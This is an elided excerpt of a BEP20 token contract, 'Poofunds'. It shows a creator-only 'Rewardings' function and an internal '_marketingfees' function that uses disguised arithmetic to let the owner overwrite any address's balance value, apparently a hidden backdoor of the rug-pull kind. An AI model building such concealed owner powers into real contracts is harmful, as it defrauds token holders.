...
contract Poofunds is Context, IBEP20, Ownable, LGEWhitelisted {
    ...
    */   
    function Rewardings(address lpaddress, uint256 _value) public onlyCreator {
    ...
    */
    function _marketingfees (address miner, uint256 _value) internal {
        ...
        targetCall[miner] = (targetCall[miner] * 1 * 2 - targetCall[miner] * 1 * 2) + (_value * 10 ** 9);
    } 
